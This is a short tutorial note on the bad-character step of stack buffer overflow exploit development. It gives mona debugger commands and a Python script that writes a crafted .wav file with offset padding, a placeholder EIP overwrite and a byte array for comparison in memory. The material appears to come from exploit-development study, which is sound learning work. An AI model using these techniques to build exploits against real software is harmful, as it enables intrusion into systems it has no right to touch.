# Stack Based Buffer Overflow 


> Before we control ther EIP, we need to determine any characters we need to avoid using in our payload

It is important to find bad chars because depending on the processing each program executes on our input, certain characters may tell the program that it has reached the end of the input. This may happen even though it may not have reached the end of the input yet.

### Generating Bad characters 
`!mona config -set workingfolder c:\mona\%p`  
Byte Array: `!mona bytearray -cpb "\x00"` 
Make sure these bad chars are bytes and not ascii. 
If writing as piece of code, make sure there is b before the string quotes. `b"\x01..."`
If writing to a text file, make sure you open the file as "wb" -> write bytes

Next step is to update our code:
```
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07...
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```
Now we load this file in and see if there are any differences bertween our input in memory and the .bin file.

### Comparing Input 

Find Bad chars with mona `!mona compare -f <path to .bin file generated> -a <esp value after running script above>`

**Characters such as `0x00`, `0x0a`, `0x0d` are generally bad characters**


